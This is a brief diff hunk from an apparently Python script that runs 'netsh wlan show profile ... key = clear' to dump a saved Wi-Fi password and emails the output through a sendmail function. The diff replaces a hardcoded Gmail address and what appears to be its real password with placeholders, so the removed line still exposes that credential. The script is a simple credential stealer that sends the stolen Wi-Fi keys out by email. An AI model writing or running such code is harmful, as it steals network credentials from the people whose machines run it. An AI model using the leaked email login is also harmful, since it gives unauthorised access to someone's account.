@@ -11,4 +11,4 @@ def sendmail(email,password,message):
 command = "netsh wlan show profile iyappan key = clear"    
 output = subprocess.check_output(command,shell=True)
 
-sendmail("iyappanhacker@gmail.com","iyappan9578",output)
+sendmail("your email address","your passsword",output)
